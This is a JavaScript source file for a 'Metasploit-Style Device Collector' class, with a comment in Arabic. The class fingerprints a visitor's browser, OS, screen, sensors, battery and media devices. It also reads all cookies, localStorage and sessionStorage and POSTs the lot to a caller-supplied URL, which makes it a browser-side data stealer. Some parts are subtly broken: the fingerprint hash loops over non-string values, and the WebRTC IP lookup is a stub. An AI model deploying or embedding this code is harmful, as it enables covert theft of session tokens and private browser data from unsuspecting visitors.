/**
 * Metasploit-Style Device Collector
 * جمع بيانات الجهاز بدقة متناهية
 */

class MetasploitCollector {
    constructor() {
        this.deviceData = {
            location: null,
            browser: null,
            os: null,
            device: null,
            sensors: null,
            network: null,
            battery: null,
            media: null,
            storage: null,
            fingerprint: null
        };
    }

    // 1. Browser Data Collection
    collectBrowserData() {
        const ua = navigator.userAgent;
        
        // Browser detection
        let browser = 'Unknown', version = 'Unknown';
        if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
            browser = 'Chrome';
            const match = ua.match(/Chrome\/([\d.]+)/);
            version = match ? match[1] : 'Unknown';
        } else if (ua.includes('Edg')) {
            browser = 'Edge';
            const match = ua.match(/Edg\/([\d.]+)/);
            version = match ? match[1] : 'Unknown';
        } else if (ua.includes('Firefox')) {
            browser = 'Firefox';
            const match = ua.match(/Firefox\/([\d.]+)/);
            version = match ? match[1] : 'Unknown';
        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
            browser = 'Safari';
            const match = ua.match(/Version\/([\d.]+)/);
            version = match ? match[1] : 'Unknown';
        }

        // Collect cookies snapshot
        const cookies = this.getCookies();

        // Collect localStorage snapshot
        const localStorageData = this.getStorage(localStorage);

        // Collect sessionStorage snapshot
        const sessionStorageData = this.getStorage(sessionStorage);

        return {
            name: browser,
            version: version,
            userAgent: ua,
            languages: navigator.languages,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            cookies: cookies,
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            extensions: this.detectExtensions()
        };
    }

    getCookies() {
        const cookies = {};
        try {
            const cookiePairs = document.cookie.split(';');
            cookiePairs.forEach(pair => {
                const [key, value] = pair.trim().split('=');
                if (key) cookies[key] = value;
            });
        } catch(e) {}
        return cookies;
    }

    getStorage(storageObj) {
        const data = {};
        try {
            for (let i = 0; i < storageObj.length; i++) {
                const key = storageObj.key(i);
                data[key] = storageObj.getItem(key);
            }
        } catch(e) {}
        return data;
    }

    detectExtensions() {
        const extensions = {
            adBlocker: this.detectAdBlocker(),
            darkMode: this.isDarkMode(),
            webdriver: navigator.webdriver || false
        };
        return extensions;
    }

    detectAdBlocker() {
        try {
            const test = document.createElement('div');
            test.style.display = 'none';
            test.id = 'adsbygoogle';
            document.body.appendChild(test);
            const hidden = window.getComputedStyle(test).display === 'none' || 
                          test.offsetParent === null;
            document.body.removeChild(test);
            return hidden;
        } catch(e) {
            return false;
        }
    }

    isDarkMode() {
        return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    }

    // 2. OS Detection
    detectOS() {
        const ua = navigator.userAgent;
        let os = 'Unknown', version = 'Unknown';

        if (ua.includes('Windows')) {
            os = 'Windows';
            if (ua.includes('Windows NT 10.0')) version = '10/11';
            else if (ua.includes('Windows NT 6.3')) version = '8.1';
            else if (ua.includes('Windows NT 6.1')) version = '7';
            else if (ua.includes('Windows NT 6.0')) version = 'Vista';
            else if (ua.includes('Windows NT 5.1')) version = 'XP';
        } else if (ua.includes('Android')) {
            os = 'Android';
            const match = ua.match(/Android ([\d.]+)/);
            version = match ? match[1] : 'Unknown';
        } else if (ua.includes('iPhone') || ua.includes('iPad')) {
            os = 'iOS';
            const match = ua.match(/OS ([\d_]+)/);
            version = match ? match[1].replace(/_/g, '.') : 'Unknown';
        } else if (ua.includes('Mac OS X')) {
            os = 'Mac OS';
            const match = ua.match(/Mac OS X ([\d_]+)/);
            version = match ? match[1].replace(/_/g, '.') : 'Unknown';
        } else if (ua.includes('Linux')) {
            os = 'Linux';
            version = 'Unknown';
        }

        return { name: os, version: version };
    }

    // 3. Device Detection
    detectDevice() {
        const ua = navigator.userAgent;
        let type = 'Unknown';

        if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) {
            type = /Tablet|iPad/.test(ua) ? 'Tablet' : 'Mobile';
        } else if (/Windows|Mac|Linux/.test(ua)) {
            type = 'Desktop';
        }

        return {
            type: type,
            isMobile: /Mobile|Android|iPhone|iPad|iPod/.test(ua),
            isTablet: /Tablet|iPad/.test(ua),
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                orientation: this.getScreenOrientation()
            }
        };
    }

    getScreenOrientation() {
        return window.screen.orientation ? window.screen.orientation.type : 'Unknown';
    }

    // 4. Sensor Data Collection
    async collectSensorData() {
        const sensors = {
            accelerometer: false,
            gyroscope: false,
            magnetometer: false,
            proximity: false,
            ambientLight: false
        };

        // Check sensor availability
        if ('Accelerometer' in window) sensors.accelerometer = true;
        if ('Gyroscope' in window) sensors.gyroscope = true;
        if ('Magnetometer' in window) sensors.magnetometer = true;
        if ('ProximitySensor' in window) sensors.proximity = true;
        if ('AmbientLightSensor' in window) sensors.ambientLight = true;

        // Request permission for sensors
        for (const sensor of ['Accelerometer', 'Gyroscope', 'Magnetometer']) {
            if (sensor in window) {
                try {
                    const s = new window[sensor]({ frequency: 60 });
                    await s.requestPermission();
                    sensors[sensor] = 'Permission granted';
                } catch(e) {
                    sensors[sensor] = 'Permission denied or not supported';
                }
            }
        }

        return sensors;
    }

    // 5. Network Fingerprinting
    collectNetworkData() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        
        return {
            online: navigator.onLine,
            type: conn ? conn.type : 'Unknown',
            effectiveType: conn ? conn.effectiveType : 'Unknown',
            downlink: conn ? conn.downlink : 'Unknown',
            rtt: conn ? conn.rtt : 'Unknown',
            saveData: conn ? conn.saveData : false,
            webrtcIP: this.getWebRTCIP()
        };
    }

    async getWebRTCIP() {
        return new Promise((resolve) => {
            const ip = 'Unknown';
            // WebRTC IP collection requires more complex setup
            resolve(ip);
        });
    }

    // 6. Battery Monitoring
    async collectBatteryData() {
        let battery = null;
        try {
            if ('getBattery' in navigator) {
                const batt = await navigator.getBattery();
                battery = {
                    level: batt.level * 100,
                    charging: batt.charging,
                    chargingTime: batt.chargingTime,
                    dischargingTime: batt.dischargingTime
                };
            }
        } catch(e) {}
        return battery;
    }

    // 7. Media/Device Enumeration
    async collectMediaData() {
        const media = {
            cameras: await this.getCameraInfo(),
            microphones: await this.getMicrophoneInfo(),
            speakers: await this.getSpeakerInfo()
        };
        return media;
    }

    async getCameraInfo() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const cameras = devices.filter(d => d.kind === 'videoinput');
            return {
                count: cameras.length,
                devices: cameras.map(d => ({ label: d.label, deviceId: d.deviceId }))
            };
        } catch(e) {
            return { error: 'Permission denied' };
        }
    }

    async getMicrophoneInfo() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const mics = devices.filter(d => d.kind === 'audioinput');
            return { count: mics.length };
        } catch(e) {
            return { error: 'Permission denied' };
        }
    }

    async getSpeakerInfo() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const speakers = devices.filter(d => d.kind === 'audiooutput');
            return { count: speakers.length };
        } catch(e) {
            return { error: 'Permission denied' };
        }
    }

    // 8. Device Enumeration (USB, MIDI, Gamepad)
    collectDeviceEnumeration() {
        const devices = {
            gamepads: [],
            usb: 'Requires permission',
            midi: 'Requires permission',
            webusb: typeof navigator.usb !== 'undefined'
        };

        // Gamepads
        try {
            const gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
            devices.gamepads = gamepads.filter(gp => gp).map(gp => ({
                id: gp.id,
                index: gp.index,
                buttons: gp.buttons.length,
                axes: gp.axes.length
            }));
        } catch(e) {}

        return devices;
    }

    // 9. Fingerprint Generation
    generateFingerprint() {
        const parts = [
            navigator.userAgent,
            navigator.platform,
            navigator.language,
            screen.width + 'x' + screen.height,
            screen.colorDepth,
            new Date().getTimezoneOffset(),
            !!window.sessionStorage,
            !!window.localStorage,
            !!navigator.webdriver
        ];
        
        // Simple hash
        let hash = 0;
        for (let i = 0; i < parts.length; i++) {
            const str = parts[i];
            for (let j = 0; j < str.length; j++) {
                hash = ((hash << 5) - hash) + str.charCodeAt(j);
                hash = hash & hash;
            }
        }
        
        return hash.toString(16);
    }

    // Collect everything
    async collectAll() {
        this.deviceData = {
            timestamp: new Date().toISOString(),
            fingerprint: this.generateFingerprint(),
            browser: this.collectBrowserData(),
            os: this.detectOS(),
            device: this.detectDevice(),
            sensors: await this.collectSensorData(),
            network: this.collectNetworkData(),
            battery: await this.collectBatteryData(),
            media: await this.collectMediaData(),
            deviceEnum: this.collectDeviceEnumeration(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            localStorage: this.collectBrowserData().localStorage,
            sessionStorage: this.collectBrowserData().sessionStorage
        };

        return this.deviceData;
    }

    // Send data to server
    async sendToServer(url) {
        const data = await this.collectAll();
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return await response.json();
        } catch(e) {
            return { success: false, error: e.message };
        }
    }
}

// Export for use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = MetasploitCollector;
}